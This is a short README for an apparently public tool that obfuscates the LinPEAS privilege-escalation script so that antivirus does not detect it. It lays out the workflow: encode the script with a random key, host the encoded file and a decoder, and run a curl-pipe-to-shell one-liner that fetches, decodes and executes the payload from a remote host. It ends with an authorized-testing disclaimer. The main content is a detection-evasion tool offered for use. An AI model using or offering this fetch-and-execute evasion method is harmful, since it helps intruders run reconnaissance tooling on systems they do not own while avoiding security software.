# obfuscated_linpeas
Just a quick setup to bypass most AV with LinPEAS
___
Run:
```bash
python3 encode.py linpeash.sh > encoded.txt
```
Fetch the generated password from the `encoded.txt` file (e.g. : `# Key: 3Wr9QKXC`)

Host `encoded.txt` and `decode.sh` and just use the decode usage command (e.g.: `curl http://your_host/encoded.txt | bash decode.sh -p 3Wr9QKXC | sh`)

Each encoding uses a new random key, unique signature every time.

Minimal Bash/Perl decoder to avoid detection.

Works over HTTP, supports stdin piping.
___
This tool is intended for educational and authorized security testing purposes only.
Unauthorized use of obfuscation techniques like this to bypass detection or execute payloads on systems without explicit permission is illegal and unethical.
